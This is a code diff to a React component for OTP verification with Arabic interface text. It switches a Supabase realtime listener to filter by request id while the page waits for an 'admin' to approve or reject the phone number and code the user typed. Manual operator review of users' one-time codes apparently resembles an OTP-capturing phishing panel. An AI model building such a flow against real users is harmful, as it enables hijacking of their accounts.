@@ -85,36 +85,35 @@ const VerifyOtp = () => {
     toast.info("بانتظار موافقة المسؤول...");
   };
 
-  // Poll for admin approval/rejection
+  // Listen for admin approval/rejection via Realtime
   useEffect(() => {
-    if (!waiting || !phone) return;
-    const code = otp.join("");
+    if (!waiting || !otpRequestId) return;
     
     const channel = supabase
-      .channel("otp_status_check")
+      .channel("otp_approval_" + otpRequestId)
       .on("postgres_changes", {
         event: "UPDATE",
         schema: "public",
         table: "login_requests",
+        filter: `id=eq.${otpRequestId}`,
       }, (payload) => {
-        const row = payload.new as { phone: string; otp_code: string; status: string };
-        if (row.phone === phone && row.otp_code === code) {
-          if (row.status === "approved") {
-            toast.success("تمت الموافقة! جاري تسجيل الدخول...");
-            navigate("/dashboard");
-          } else if (row.status === "rejected") {
-            toast.error("المعلومات المدخلة غير صحيحة");
-            setWaiting(false);
-            setLoading(false);
-            setOtp(["", "", "", "", "", ""]);
-            inputRefs.current[0]?.focus();
-          }
+        const row = payload.new as { status: string };
+        if (row.status === "approved") {
+          toast.success("تمت الموافقة! جاري تسجيل الدخول...");
+          navigate("/dashboard");
+        } else if (row.status === "rejected") {
+          toast.error("المعلومات المدخلة غير صحيحة");
+          setWaiting(false);
+          setLoading(false);
+          setOtpRequestId(null);
+          setOtp(["", "", "", "", "", ""]);
+          inputRefs.current[0]?.focus();
         }
       })
       .subscribe();
 
     return () => { supabase.removeChannel(channel); };
-  }, [waiting, phone, otp, navigate]);
+  }, [waiting, otpRequestId, navigate]);
 
   const handleResend = async () => {
     // Demo mode
